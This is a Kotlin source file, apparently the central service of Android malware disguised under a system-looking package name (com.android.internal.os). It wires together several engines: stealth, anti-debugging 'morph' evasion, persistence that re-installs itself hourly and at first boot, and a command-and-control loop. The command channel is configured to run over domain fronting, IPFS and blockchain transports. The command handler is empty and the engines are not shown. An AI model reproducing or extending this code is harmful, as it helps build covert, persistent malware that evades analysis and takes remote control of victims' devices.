package com.android.internal.os

import android.content.Context
import com.android.internal.os.crypto.CryptoEngine
import com.android.internal.os.gateway.GatewayClient
import com.android.internal.os.opsec.MonitorEngine
import com.android.internal.os.opsec.SecurityState
import com.android.internal.os.persistence.PersistenceEngine
import com.android.internal.os.stealth.StealthEngine
import com.android.internal.os.traffic.TrafficEngine
import com.android.internal.os.morph.AppMorphEngine
import com.android.internal.os.traffic.TransportLayer
import kotlin.concurrent.thread

class CoreService private constructor() {

    private var context: Context? = null
    private var initialized = false
    private var lock = Object()

    lateinit var monitor: MonitorEngine
    lateinit var persistence: PersistenceEngine
    lateinit var traffic: TrafficEngine
    lateinit var crypto: CryptoEngine
    lateinit var stealth: StealthEngine
    lateinit var gateway: GatewayClient
    lateinit var morph: AppMorphEngine

    private var running = false

    fun init(ctx: Context, config: AppConfig = AppConfig()) {
        synchronized(lock) {
            if (initialized) return
            context = ctx

            monitor = MonitorEngine.getInstance().also { it.init(ctx) }
            persistence = PersistenceEngine.getInstance().also { it.init(ctx) }
            traffic = TrafficEngine.getInstance().also { it.init(ctx, config.toTrafficConfig()) }
            crypto = CryptoEngine.getInstance()
            stealth = StealthEngine.getInstance()
            gateway = GatewayClient().also { it.init(ctx) }
            morph = AppMorphEngine.getInstance().also { it.init(ctx) }

            initialized = true
        }
    }

    fun startServices() {
        if (!initialized) return
        running = true

        thread(name = "bg-monitor") {
            while (running) {
                try {
                    val profile = monitor.checkEnvironment(context!!)
                    if (profile.debuggerAttached || profile.dangerScore > 0.6f) {
                        monitor.reportEvent("env_check", profile.dangerScore)
                        morph.morphNow()
                    }
                    val nextDanger = monitor.predictNextDangerTimeMs()
                    if (nextDanger != null) {
                        val remaining = nextDanger - System.currentTimeMillis()
                        if (remaining < 300000 && remaining > 0) {
                            if (monitor.canTransitionTo(SecurityState.DORMANT)) {
                                monitor.reportEvent("predicted_danger", 0.8f)
                                morph.morphNow()
                            }
                        }
                    }
                    Thread.sleep(monitor.getNextActionDelayMs())
                } catch (_: Exception) { break }
            }
        }

        thread(name = "bg-morph") {
            morph.startMorphCycle(300000)
        }

        thread(name = "bg-persistence") {
            while (running) {
                try {
                    Thread.sleep(3600000)
                    persistence.verifyAll()
                    if (persistence.getActiveCount() == 0) {
                        persistence.installAll()
                    }
                } catch (_: Exception) { break }
            }
        }

        thread(name = "bg-traffic") {
            while (running) {
                try {
                    val msgs = traffic.pollMessages("aos-control")
                    for (msg in msgs) {
                        handleRelayMessage(msg)
                    }
                    Thread.sleep(30000)
                } catch (_: Exception) { break }
            }
        }

        thread(name = "bg-firstboot") {
            try {
                Thread.sleep(15000)
                persistence.installAll()
            } catch (_: Exception) {}
        }
    }

    fun stopServices() {
        running = false
    }

    fun isReady(): Boolean = initialized

    fun getFullReport(): String {
        val sb = StringBuilder()
        sb.appendLine("=== Core System Report ===")
        sb.appendLine()
        sb.appendLine(monitor.getReport())
        sb.appendLine()
        sb.appendLine(persistence.getReport())
        sb.appendLine()
        sb.appendLine(traffic.getReport())
        sb.appendLine()
        sb.appendLine("Transport: ${traffic.getOptimalTransport()}")
        sb.appendLine("Persistence: ${persistence.getActiveCount()} mechanisms active")
        sb.appendLine()
        sb.appendLine(morph.getReport())
        return sb.toString()
    }

    private fun handleRelayMessage(msg: com.android.internal.os.traffic.Message) {
    }

    data class AppConfig(
        val frontDomain: String = "",
        val backendUrl: String = "",
        val cdnProvider: String = "cloudfront",
        val ipfsApiUrl: String = "https://ipfs.io/api/v0",
        val ipfsTopic: String = "aos-${kotlin.random.Random.nextInt(100000, 999999)}",
        val blockchainRpc: String = "https://bsc-dataseed.binance.org",
        val blockchainAddress: String = "",
        val blockchainContract: String = "",
        val enabledTransports: List<TransportLayer> = listOf(
            TransportLayer.DOMAIN_FRONTING,
            TransportLayer.IPFS_RELAY,
            TransportLayer.BLOCKCHAIN,
            TransportLayer.DIRECT_HTTPS
        )
    ) {
        fun toTrafficConfig(): TrafficEngine.TrafficConfig {
            return TrafficEngine.TrafficConfig(
                frontDomain = frontDomain, c2Backend = backendUrl, cdnProvider = cdnProvider,
                ipfsApiUrl = ipfsApiUrl, ipfsTopic = ipfsTopic,
                blockchainRpc = blockchainRpc, blockchainAddress = blockchainAddress,
                blockchainContract = blockchainContract, enabledTransports = enabledTransports
            )
        }
    }

    companion object {
        @Volatile private var instance: CoreService? = null
        fun getInstance(): CoreService {
            return instance ?: synchronized(this) {
                instance ?: CoreService().also { instance = it }
            }
        }
    }
}
